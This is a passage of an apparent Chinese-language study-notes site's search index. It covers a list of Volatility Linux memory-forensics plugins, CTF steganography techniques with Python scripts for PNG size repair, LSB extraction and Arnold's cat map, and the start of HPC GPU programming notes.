userland apihooks linux_arp - Print the ARP table linux_aslr_shift - Automatically detect the Linux ASLR shift linux_banner - Prints the Linux banner information linux_bash - Recover bash history from bash process memory linux_bash_env - Recover a process' dynamic environment variables linux_bash_hash - Recover bash hash table from bash process memory linux_check_afinfo - Verifies the operation function pointers of network protocols linux_check_creds - Checks if any processes are sharing credential structures linux_check_evt_arm - Checks the Exception Vector Table to look for syscall table hooking linux_check_fop - Check file operation structures for rootkit modifications linux_check_idt - Checks if the IDT has been altered linux_check_inline_kernel - Check for inline kernel hooks linux_check_modules - Compares module list to sysfs info, if available linux_check_syscall - Checks if the system call table has been altered linux_check_syscall_arm - Checks if the system call table has been altered linux_check_tty - Checks tty devices for hooks linux_cpuinfo - Prints info about each active processor linux_dentry_cache - Gather files from the dentry cache linux_dmesg - Gather dmesg buffer linux_dump_map - Writes selected memory mappings to disk linux_dynamic_env - Recover a process' dynamic environment variables linux_elfs - Find ELF binaries in process mappings linux_enumerate_files - Lists files referenced by the filesystem cache linux_find_file - Lists and recovers files from memory linux_getcwd - Lists current working directory of each process linux_hidden_modules - Carves memory to find hidden kernel modules linux_ifconfig - Gathers active interfaces linux_info_regs - It's like 'info registers' in GDB. It prints out all the linux_iomem - Provides output similar to /proc/iomem linux_kernel_opened_files - Lists files that are opened from within the kernel linux_keyboard_notifiers - Parses the keyboard notifier call chain linux_ldrmodules - Compares the output of proc maps with the list of libraries from libdl linux_library_list - Lists libraries loaded into a process linux_librarydump - Dumps shared libraries in process memory to disk linux_list_raw - List applications with promiscuous sockets linux_lsmod - Gather loaded kernel modules linux_lsof - Lists file descriptors and their path linux_malfind - Looks for suspicious process mappings linux_memmap - Dumps the memory map for linux tasks linux_moddump - Extract loaded kernel modules linux_mount - Gather mounted fs/devices linux_mount_cache - Gather mounted fs/devices from kmem_cache linux_netfilter - Lists Netfilter hooks linux_netscan - Carves for network connection structures linux_netstat - Lists open sockets linux_pidhashtable - Enumerates processes through the PID hash table linux_pkt_queues - Writes per-process packet queues out to disk linux_plthook - Scan ELF binaries' PLT for hooks to non-NEEDED images linux_proc_maps - Gathers process memory maps linux_proc_maps_rb - Gathers process maps for linux through the mappings red-black tree linux_procdump - Dumps a process's executable image to disk linux_process_hollow - Checks for signs of process hollowing linux_psaux - Gathers processes along with full command line and start time linux_psenv - Gathers processes along with their static environment variables linux_pslist - Gather active tasks by walking the task_struct->task list linux_pslist_cache - Gather tasks from the kmem_cache linux_psscan - Scan physical memory for processes linux_pstree - Shows the parent/child relationship between processes linux_psxview - Find hidden processes with various process listings linux_recover_filesystem - Recovers the entire cached file system from memory linux_route_cache - Recovers the routing cache from memory linux_sk_buff_cache - Recovers packets from the sk_buff kmem_cache linux_slabinfo - Mimics /proc/slabinfo on a running machine linux_strings - Match physical offsets to virtual addresses (may take a while, VERY verbose) linux_threads - Prints threads of processes linux_tmpfs - Recovers tmpfs filesystems from memory linux_truecrypt_passphrase - Recovers cached Truecrypt passphrases linux_vma_cache - Gather VMAs from the vm_area_struct cache linux_volshell - Shell in the memory image linux_yarascan - A shell in the Linux memory image \u4e0d\u8fc7\u505a\u9898\u611f\u89c9\u6765\u8bf4\u5bf9 Linux \u7528 volatility \u6ca1\u6709\u5bf9 Windows \u7528\u597d\u7528\u3002","title":"Linux \u53d6\u8bc1"},{"location":"ctf/steg/","text":"\u9690\u5199\u672f \u00b6 Steganography is the practice of concealing a message within another message or a physical object. In computing/electronic contexts, a computer file, message, image, or video is concealed within another file, message, image, or video. \u2014\u2014\u2014\u2014 Wikipedia Abstract \u9690\u5199\u662f CTF \u4e2d misc \u7c7b\u9898\u76ee\u6bd4\u8f83\u5e38\u51fa\u7684\u7c7b\u578b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u5c31\u662f\u8981\u7834\u89e3\u9690\u5199\u7684\u65b9\u6cd5\uff0c\u5f97\u5230\u88ab\u9690\u5199\u7684\u5185\u5bb9\uff08flag\uff09 \u56fe\u7247\u3001\u97f3\u9891\u3001\u89c6\u9891\u7b49\u5a92\u4f53\u6587\u4ef6\u90fd\u53ef\u80fd\u7528\u6765\u9690\u5199\uff0c\u8303\u56f4\u5e7f\u6837\u5f0f\u591a Table of Contents \u00b6 \u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199","title":"\u9690\u5199\u672f"},{"location":"ctf/steg/#_1","text":"Steganography is the practice of concealing a message within another message or a physical object. In computing/electronic contexts, a computer file, message, image, or video is concealed within another file, message, image, or video. \u2014\u2014\u2014\u2014 Wikipedia Abstract \u9690\u5199\u662f CTF \u4e2d misc \u7c7b\u9898\u76ee\u6bd4\u8f83\u5e38\u51fa\u7684\u7c7b\u578b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u5c31\u662f\u8981\u7834\u89e3\u9690\u5199\u7684\u65b9\u6cd5\uff0c\u5f97\u5230\u88ab\u9690\u5199\u7684\u5185\u5bb9\uff08flag\uff09 \u56fe\u7247\u3001\u97f3\u9891\u3001\u89c6\u9891\u7b49\u5a92\u4f53\u6587\u4ef6\u90fd\u53ef\u80fd\u7528\u6765\u9690\u5199\uff0c\u8303\u56f4\u5e7f\u6837\u5f0f\u591a","title":"\u9690\u5199\u672f"},{"location":"ctf/steg/#table-of-contents","text":"\u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199","title":"Table of Contents"},{"location":"ctf/steg/audio/","text":"\u97f3\u9891\u9690\u5199 \u00b6 \u770b\u6ce2\u5f62/\u9891\u8c31 mp3stego \u8f6f\u4ef6\u9690\u5199 SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\uff0c\u4f7f\u7528 Robot36 \u7b49\u624b\u673a\u8f6f\u4ef6\u8bc6\u522b","title":"\u97f3\u9891\u9690\u5199"},{"location":"ctf/steg/audio/#_1","text":"\u770b\u6ce2\u5f62/\u9891\u8c31 mp3stego \u8f6f\u4ef6\u9690\u5199 SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\uff0c\u4f7f\u7528 Robot36 \u7b49\u624b\u673a\u8f6f\u4ef6\u8bc6\u522b","title":"\u97f3\u9891\u9690\u5199"},{"location":"ctf/steg/image/","text":"\u56fe\u7247\u9690\u5199 \u00b6 \u9690\u85cf\u6587\u4ef6 \u00b6 \u56fe\u7247\u4e00\u822c\u53ea\u8bfb\u53d6\u5230\u9700\u8981\u7684\u5927\u5c0f\u5c31\u505c\u6b62\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u5176\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u540e\u9762\u63d2\u5165\u5176\u4ed6\u6587\u4ef6 \u8fd9\u65f6\u76f4\u63a5\u4f7f\u7528 binwalk foremost \u7b49\u5de5\u5177\u5c31\u53ef\u4ee5\u53d1\u73b0\u3001\u63d0\u53d6 png \u6539\u53d8\u5927\u5c0f \u00b6 png \u7684\u6587\u4ef6\u5934\u8bb0\u5f55\u4e86\u56fe\u7247\u7684\u5927\u5c0f\uff0c\u8d85\u8fc7\u5927\u5c0f\u7684\u6570\u636e\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728\u56fe\u7247\u91cc \u5982\u679c\u662f\u5229\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u9690\u5199\u7684\u53ef\u4ee5\u76f4\u63a5\u66f4\u6539 png \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\u6765\u6539\u53d8\u5927\u5c0f\u770b\u5230\u9690\u85cf\u7684\u5185\u5bb9 png \u6587\u4ef6\u5934\u683c\u5f0f \u00b6 \uff08 8 bytes\uff09png \u6587\u4ef6\u5934\u6807\u8bc6\uff1a 89 50 4E 47 0D 0A 1A 0A \uff08 4 bytes\uff09IHDR \u6570\u636e\u5757\u957f\u5ea6 13: 00 00 00 0D \uff08 4 bytes\uff09IHDR \u5757\u6807\u8bc6\uff1a 49 48 44 52 \uff0813 bytes\uff09IHDR \u5757\uff1a \uff084 bytes\uff09\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff084 bytes\uff09\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff085 bytes\uff09bit depth\u3001color type\u3001compression method\u3001filter method\u3001interlace method \uff08 4 bytes\uff09crc \u6821\u9a8c\u7801\uff0c\u4ece IHDR \u6807\u8bc6\u5230\u5757\u7ed3\u675f\u603b\u5171 17 bytes \u7684 crc \u6821\u9a8c\u7801 \u7206\u7834\u5927\u5c0f \u00b6 import struct import binascii img = open ( \"....png\" , \"rb\" ) . read () height , width = 0 , 0 for i in range ( ... ): for j in range ( ... ): data = img [ 12 : 16 ] + struct . pack ( '>i' , i ) + struct . pack ( '>i' , j ) + img [ 24 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0 x ........ : height = i width = j print ( 'hex:' , hex ( i ), hex ( j )) new_img = list ( img ) new_img [ 16 : 20 ] = struct . pack ( '>i' , height ) new_img [ 20 : 24 ] = struct . pack ( '>i' , width ) with open ( 'out.png' , 'wb' ) as f : f . write ( bytes ( new_img )) LSB \u9690\u5199 \u00b6 LSB\uff08Least Significant Bit\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5\u3002\u56e0\u4e3a\u4eba\u773c\u5bf9\u989c\u8272\u7684\u5206\u8fa8\u6709\u9650\u5ea6\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539\u56fe\u7247\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u7684\u989c\u8272\u6bd4\u7279\u7684\u6700\u4f4e\u4f4d\u6765\u9690\u85cf\u4fe1\u606f\uff0c\u4f46\u4e0d\u88ab\u4eba\u773c\u5206\u8fa8\u51fa\u6765 \u8fd9\u79cd\u9898\u76ee\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528 stegsolve \u8f6f\u4ef6\u6765\u5b8c\u6210\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u6700\u4f4e\u4f4d\u63d0\u53d6\u51fa\u6765\u4f5c\u4e3a\u7070\u5ea6\u662f\u4e00\u5f20\u56fe\u7247\uff1a\u76f4\u63a5\u5728 stegsolve \u4e2d\u6253\u5f00\u7136\u540e\u53f3\u7bad\u5934\u7ffb\u627e\u5c31\u53ef\u4ee5 \u6700\u4f4e\u4f4d\u9690\u85cf\u4e86\u4e8c\u8fdb\u5236\u4fe1\u606f\uff1astegsolve \u6253\u5f00\uff0cAnalyze -> Data Extract \u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 PIL \u5e93\u6765\u5b8c\u6210\uff1a from PIL import Image img = Image . open ( \"...\" ) width , height = img . size img2 = Image . new ( \"L\" , img . size ) for i in range ( width ): for j in range ( height ): R , G , B , A = pix = img . getpixel (( i , j )) # C, M, Y, K = pix = img.getpixel((i,j)) # Y, Cb, Cr = pix = img.getpixel((i, j)) if R & 0b1 == 0 : img2 . putpixel (( i , j ), 0 ) else : img2 . putpixel (( i , j ), 255 ) img2 . show () \u5728 mac \u4e0a\uff0cstegsolve data extract \u4f1a\u51fa\u73b0 UI \u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177 zsteg \u66ff\u4ee3\uff1a zsteg image.png b1,lsb -a -v # \u663e\u793a\u6240\u6709 bgr \u987a\u5e8f\u4e0b\u7684\u6700\u4f4e\u4f4d lsb zsteg -E '1b,bgr,lsb' image.png # \u786e\u5b9a bgr \u987a\u5e8f\u540e\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c \u8272\u5f69\u6a21\u5f0f \u00b6 \u4f46\u6709\u65f6\u539f\u6587\u4ef6\u7684 lsb \u770b\u4e0d\u5230\u6216\u8005\u4e0d\u6e05\u695a\uff0c\u8003\u8651\u662f\u8f6c\u6362\u4e86\u8272\u5f69\u683c\u5f0f \u56e0\u4e3a lsb \u7684\u539f\u7406\u662f\u63d0\u53d6\u89c6\u89c9\u5f71\u54cd\u5f31\u7684\u4f4e\u4f4d\uff0c\u6240\u4ee5\u8981\u6c42\u8f6c\u6362\u5fc5\u987b\u5b8c\u5168\u7cbe\u51c6\uff0c\u4e00\u822c\u90fd\u91c7\u7528 PIL \u6216\u8005 cv2 \u5e93\u4e2d\u7684\u5185\u7f6e\u65b9\u6cd5\u8f6c\u6362\uff08\u56e0\u4e3a\u8fd0\u7b97\u65b9\u6cd5\u786e\u5b9a\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 Ps \u7b49\u8f6f\u4ef6\u6765\u8f6c\u6362\u8272\u5f69\u6a21\u5f0f\uff08\u8fc7\u4e8e\u590d\u6742\uff0c\u4e0d\u6613\u64cd\u63a7\uff0c\u4f1a\u635f\u5931\u4f4e\u4f4d\u6570\u636e\uff09 PIL.Image \u4e2d\u652f\u6301 11 \u79cd\u56fe\u7247\u6a21\u5f0f\uff1a1\u3001L\u3001P\u3001RGB\u3001RGBA\u3001CMYK\u3001YCbCr\u3001LAB\u3001HSV\u3001I\u3001F https://pillow.readthedocs.io/en/stable/handbook/concepts.html#concept-modes 1 \u9ed1\u767d\u4e8c\u503c\uff08\u4f46\u662f\u662f0\u548c255\uff09 L \u7070\u5ea6\uff08I\u4e5f\u662f\u7070\u5ea6\uff0c\u4f46L\u662f8bit\u5b58\u50a8\uff0cI\u662f32bit\u5b58\u50a8 RGB \u8f6c L \uff1a L = R * 299/1000 + G * 587/1000+ B * 114/1000 P 8bit\u8272\u503c RGB\u548cCMYK\u8f6c\u6362\u65f6\u6709\u8272\u5dee\uff0c\u56e0\u4e3a\u8f6c\u6362\u7684\u516c\u5f0f\u662f\uff1a C = 255 - R M = 255 - G Y = 255 - B K = 0 \u4e5f\u56e0\u6b64\u5728LSB\u9690\u5199\u65f6\u8fd9\u4e24\u79cd\u6a21\u5f0f\u6ca1\u6709\u5dee\u522b \u4f46\u662f RGB \u548c YCbCr\u3001LAB\u3001HSV \u4e4b\u95f4\u590d\u6742\u7684\u8f6c\u6362\u65f6\u5c31\u6709\u4e86\u5dee\u522b\uff0c\u4f7f\u7528\u65f6\u76f4\u63a5 .convert(\"mode\") \u5373\u53ef\u3002\u4e00\u4e9b PIL \u4e0d\u652f\u6301\u7684\u8f6c\u6362\u4e5f\u53ef\u4ee5\u4f7f\u7528 cv2 Arnold's cat map \u00b6 Arnold's cat map \u662f\u4e00\u79cd\u7b97\u6cd5\uff0c\u6765\u6253\u4e71\u50cf\u7d20\u70b9\uff0c\u5e76\u4e14\u5728\u4e00\u5b9a\u6b21\u6570\u540e\u4f1a\u6062\u590d\u539f\u6837 https://en.wikipedia.org/wiki/Arnold%27s_cat_map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 2 * x + 1 * y ) % width # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 ny = ( 1 * x + 1 * y ) % height # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"...\" , ... ) result . show () \u9690\u5199\u5de5\u5177 \u00b6 \u6709\u4e9b\u56fe\u7247\u9690\u5199\u662f\u5229\u7528\u67d0\u4e9b\u8f6f\u4ef6\u6765\u9690\u85cf\u7684\u6570\u636e\uff0c\u8fd9\u79cd\u4e00\u822c\u90fd\u9700\u8981\u5bc6\u7801\u6765\u89e3\u5bc6\uff0c\u5e38\u89c1\u7684\u6709\uff1a steghide\uff1a http://steghide.sourceforge.net/ SilentEye\uff1a https://achorein.github.io/silenteye/","title":"\u56fe\u7247\u9690\u5199"},{"location":"ctf/steg/image/#_1","text":"","title":"\u56fe\u7247\u9690\u5199"},{"location":"ctf/steg/image/#_2","text":"\u56fe\u7247\u4e00\u822c\u53ea\u8bfb\u53d6\u5230\u9700\u8981\u7684\u5927\u5c0f\u5c31\u505c\u6b62\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u5176\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u540e\u9762\u63d2\u5165\u5176\u4ed6\u6587\u4ef6 \u8fd9\u65f6\u76f4\u63a5\u4f7f\u7528 binwalk foremost \u7b49\u5de5\u5177\u5c31\u53ef\u4ee5\u53d1\u73b0\u3001\u63d0\u53d6","title":"\u9690\u85cf\u6587\u4ef6"},{"location":"ctf/steg/image/#png","text":"png \u7684\u6587\u4ef6\u5934\u8bb0\u5f55\u4e86\u56fe\u7247\u7684\u5927\u5c0f\uff0c\u8d85\u8fc7\u5927\u5c0f\u7684\u6570\u636e\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728\u56fe\u7247\u91cc \u5982\u679c\u662f\u5229\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u9690\u5199\u7684\u53ef\u4ee5\u76f4\u63a5\u66f4\u6539 png \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\u6765\u6539\u53d8\u5927\u5c0f\u770b\u5230\u9690\u85cf\u7684\u5185\u5bb9","title":"png \u6539\u53d8\u5927\u5c0f"},{"location":"ctf/steg/image/#png_1","text":"\uff08 8 bytes\uff09png \u6587\u4ef6\u5934\u6807\u8bc6\uff1a 89 50 4E 47 0D 0A 1A 0A \uff08 4 bytes\uff09IHDR \u6570\u636e\u5757\u957f\u5ea6 13: 00 00 00 0D \uff08 4 bytes\uff09IHDR \u5757\u6807\u8bc6\uff1a 49 48 44 52 \uff0813 bytes\uff09IHDR \u5757\uff1a \uff084 bytes\uff09\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff084 bytes\uff09\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff085 bytes\uff09bit depth\u3001color type\u3001compression method\u3001filter method\u3001interlace method \uff08 4 bytes\uff09crc \u6821\u9a8c\u7801\uff0c\u4ece IHDR \u6807\u8bc6\u5230\u5757\u7ed3\u675f\u603b\u5171 17 bytes \u7684 crc \u6821\u9a8c\u7801","title":"png \u6587\u4ef6\u5934\u683c\u5f0f"},{"location":"ctf/steg/image/#_3","text":"import struct import binascii img = open ( \"....png\" , \"rb\" ) . read () height , width = 0 , 0 for i in range ( ... ): for j in range ( ... ): data = img [ 12 : 16 ] + struct . pack ( '>i' , i ) + struct . pack ( '>i' , j ) + img [ 24 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0 x ........ : height = i width = j print ( 'hex:' , hex ( i ), hex ( j )) new_img = list ( img ) new_img [ 16 : 20 ] = struct . pack ( '>i' , height ) new_img [ 20 : 24 ] = struct . pack ( '>i' , width ) with open ( 'out.png' , 'wb' ) as f : f . write ( bytes ( new_img ))","title":"\u7206\u7834\u5927\u5c0f"},{"location":"ctf/steg/image/#lsb","text":"LSB\uff08Least Significant Bit\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5\u3002\u56e0\u4e3a\u4eba\u773c\u5bf9\u989c\u8272\u7684\u5206\u8fa8\u6709\u9650\u5ea6\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539\u56fe\u7247\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u7684\u989c\u8272\u6bd4\u7279\u7684\u6700\u4f4e\u4f4d\u6765\u9690\u85cf\u4fe1\u606f\uff0c\u4f46\u4e0d\u88ab\u4eba\u773c\u5206\u8fa8\u51fa\u6765 \u8fd9\u79cd\u9898\u76ee\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528 stegsolve \u8f6f\u4ef6\u6765\u5b8c\u6210\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u6700\u4f4e\u4f4d\u63d0\u53d6\u51fa\u6765\u4f5c\u4e3a\u7070\u5ea6\u662f\u4e00\u5f20\u56fe\u7247\uff1a\u76f4\u63a5\u5728 stegsolve \u4e2d\u6253\u5f00\u7136\u540e\u53f3\u7bad\u5934\u7ffb\u627e\u5c31\u53ef\u4ee5 \u6700\u4f4e\u4f4d\u9690\u85cf\u4e86\u4e8c\u8fdb\u5236\u4fe1\u606f\uff1astegsolve \u6253\u5f00\uff0cAnalyze -> Data Extract \u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 PIL \u5e93\u6765\u5b8c\u6210\uff1a from PIL import Image img = Image . open ( \"...\" ) width , height = img . size img2 = Image . new ( \"L\" , img . size ) for i in range ( width ): for j in range ( height ): R , G , B , A = pix = img . getpixel (( i , j )) # C, M, Y, K = pix = img.getpixel((i,j)) # Y, Cb, Cr = pix = img.getpixel((i, j)) if R & 0b1 == 0 : img2 . putpixel (( i , j ), 0 ) else : img2 . putpixel (( i , j ), 255 ) img2 . show () \u5728 mac \u4e0a\uff0cstegsolve data extract \u4f1a\u51fa\u73b0 UI \u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177 zsteg \u66ff\u4ee3\uff1a zsteg image.png b1,lsb -a -v # \u663e\u793a\u6240\u6709 bgr \u987a\u5e8f\u4e0b\u7684\u6700\u4f4e\u4f4d lsb zsteg -E '1b,bgr,lsb' image.png # \u786e\u5b9a bgr \u987a\u5e8f\u540e\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c","title":"LSB \u9690\u5199"},{"location":"ctf/steg/image/#_4","text":"\u4f46\u6709\u65f6\u539f\u6587\u4ef6\u7684 lsb \u770b\u4e0d\u5230\u6216\u8005\u4e0d\u6e05\u695a\uff0c\u8003\u8651\u662f\u8f6c\u6362\u4e86\u8272\u5f69\u683c\u5f0f \u56e0\u4e3a lsb \u7684\u539f\u7406\u662f\u63d0\u53d6\u89c6\u89c9\u5f71\u54cd\u5f31\u7684\u4f4e\u4f4d\uff0c\u6240\u4ee5\u8981\u6c42\u8f6c\u6362\u5fc5\u987b\u5b8c\u5168\u7cbe\u51c6\uff0c\u4e00\u822c\u90fd\u91c7\u7528 PIL \u6216\u8005 cv2 \u5e93\u4e2d\u7684\u5185\u7f6e\u65b9\u6cd5\u8f6c\u6362\uff08\u56e0\u4e3a\u8fd0\u7b97\u65b9\u6cd5\u786e\u5b9a\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 Ps \u7b49\u8f6f\u4ef6\u6765\u8f6c\u6362\u8272\u5f69\u6a21\u5f0f\uff08\u8fc7\u4e8e\u590d\u6742\uff0c\u4e0d\u6613\u64cd\u63a7\uff0c\u4f1a\u635f\u5931\u4f4e\u4f4d\u6570\u636e\uff09 PIL.Image \u4e2d\u652f\u6301 11 \u79cd\u56fe\u7247\u6a21\u5f0f\uff1a1\u3001L\u3001P\u3001RGB\u3001RGBA\u3001CMYK\u3001YCbCr\u3001LAB\u3001HSV\u3001I\u3001F https://pillow.readthedocs.io/en/stable/handbook/concepts.html#concept-modes 1 \u9ed1\u767d\u4e8c\u503c\uff08\u4f46\u662f\u662f0\u548c255\uff09 L \u7070\u5ea6\uff08I\u4e5f\u662f\u7070\u5ea6\uff0c\u4f46L\u662f8bit\u5b58\u50a8\uff0cI\u662f32bit\u5b58\u50a8 RGB \u8f6c L \uff1a L = R * 299/1000 + G * 587/1000+ B * 114/1000 P 8bit\u8272\u503c RGB\u548cCMYK\u8f6c\u6362\u65f6\u6709\u8272\u5dee\uff0c\u56e0\u4e3a\u8f6c\u6362\u7684\u516c\u5f0f\u662f\uff1a C = 255 - R M = 255 - G Y = 255 - B K = 0 \u4e5f\u56e0\u6b64\u5728LSB\u9690\u5199\u65f6\u8fd9\u4e24\u79cd\u6a21\u5f0f\u6ca1\u6709\u5dee\u522b \u4f46\u662f RGB \u548c YCbCr\u3001LAB\u3001HSV \u4e4b\u95f4\u590d\u6742\u7684\u8f6c\u6362\u65f6\u5c31\u6709\u4e86\u5dee\u522b\uff0c\u4f7f\u7528\u65f6\u76f4\u63a5 .convert(\"mode\") \u5373\u53ef\u3002\u4e00\u4e9b PIL \u4e0d\u652f\u6301\u7684\u8f6c\u6362\u4e5f\u53ef\u4ee5\u4f7f\u7528 cv2","title":"\u8272\u5f69\u6a21\u5f0f"},{"location":"ctf/steg/image/#arnolds-cat-map","text":"Arnold's cat map \u662f\u4e00\u79cd\u7b97\u6cd5\uff0c\u6765\u6253\u4e71\u50cf\u7d20\u70b9\uff0c\u5e76\u4e14\u5728\u4e00\u5b9a\u6b21\u6570\u540e\u4f1a\u6062\u590d\u539f\u6837 https://en.wikipedia.org/wiki/Arnold%27s_cat_map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 2 * x + 1 * y ) % width # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 ny = ( 1 * x + 1 * y ) % height # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"...\" , ... ) result . show ()","title":"Arnold's cat map"},{"location":"ctf/steg/image/#_5","text":"\u6709\u4e9b\u56fe\u7247\u9690\u5199\u662f\u5229\u7528\u67d0\u4e9b\u8f6f\u4ef6\u6765\u9690\u85cf\u7684\u6570\u636e\uff0c\u8fd9\u79cd\u4e00\u822c\u90fd\u9700\u8981\u5bc6\u7801\u6765\u89e3\u5bc6\uff0c\u5e38\u89c1\u7684\u6709\uff1a steghide\uff1a http://steghide.sourceforge.net/ SilentEye\uff1a https://achorein.github.io/silenteye/","title":"\u9690\u5199\u5de5\u5177"},{"location":"hpc/","text":"\u9ad8\u6027\u80fd\u8ba1\u7b97 \u00b6 Abstract \u5927\u4e00\u6691\u5047\u5c0f\u5b66\u671f\u9009\u4e86\u8d85\u7b97\u961f\u7684\u8bfe\uff0c\u611f\u53d7\u611f\u53d7\u3001\u73a9\u4e00\u73a9\uff0c\u4e0d\u6e05\u695a\u4e4b\u540e\u4f1a\u4e0d\u4f1a\u7ee7\u7eed\u641e Table of Contents \u00b6 HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f \u5411\u91cf\u5316\u8ba1\u7b97 GPU \u7f16\u7a0b OpenMP \u57fa\u7840 MPI \u57fa\u7840 \u673a\u5668\u5b66\u4e60\u57fa\u7840","title":"\u9ad8\u6027\u80fd\u8ba1\u7b97"},{"location":"hpc/#_1","text":"Abstract \u5927\u4e00\u6691\u5047\u5c0f\u5b66\u671f\u9009\u4e86\u8d85\u7b97\u961f\u7684\u8bfe\uff0c\u611f\u53d7\u611f\u53d7\u3001\u73a9\u4e00\u73a9\uff0c\u4e0d\u6e05\u695a\u4e4b\u540e\u4f1a\u4e0d\u4f1a\u7ee7\u7eed\u641e","title":"\u9ad8\u6027\u80fd\u8ba1\u7b97"},{"location":"hpc/#table-of-contents","text":"HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f \u5411\u91cf\u5316\u8ba1\u7b97 GPU \u7f16\u7a0b OpenMP \u57fa\u7840 MPI \u57fa\u7840 \u673a\u5668\u5b66\u4e60\u57fa\u7840","title":"Table of Contents"},{"location":"hpc/hpc101/gpu/","text":"GPU \u7f16\u7a0b \u00b6 Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516d\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e09\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516d\u6b21\u8bfe PPT NVIDIA Deep Learning Institute\uff1a \u52a0\u901f\u8ba1\u7b97\u57fa\u7840 \u2014\u2014 CUDA C/C++ GPU \u00b6 \u63d0\u4f9b\u66f4\u9ad8\u7b97\u529b CPU\uff1a\u6838\u6570\u5c11\u3001\u590d\u6742\uff1bcache \u5f88\u5927\uff1b\u5185\u5b58\u5927\u4f46\u6162\uff1b\u9002\u5408\u4e32\u884c\u6216\u7b80\u5355\u5e76\u884c GPU\uff1a\u6838\u6570\u5f88\u591a\u3001\u7b80\u5355\uff1bcache \u5f88\u5c0f\uff1b\u5185\u5b58\u5c0f\u4f46\u5feb\uff1b\u9002\u5408\u590d\u6742\u5e76\u884c \u7f16\u7a0b\u6a21\u578b\u4e0e\u786c\u4ef6\u6267\u884c\u6a21\u578b \u00b6 \u786c\u4ef6\u6267\u884c\u6a21\u578b\uff08Hardware Execution Model\uff09<-> CUDA \u7f16\u7a0b\u6a21\u578b GPU <-> Grid Streaming Multi-processor <-> Thread block CUDA core <-> Thread GPU \u7f16\u7a0b\u6a21\u578b\u662f 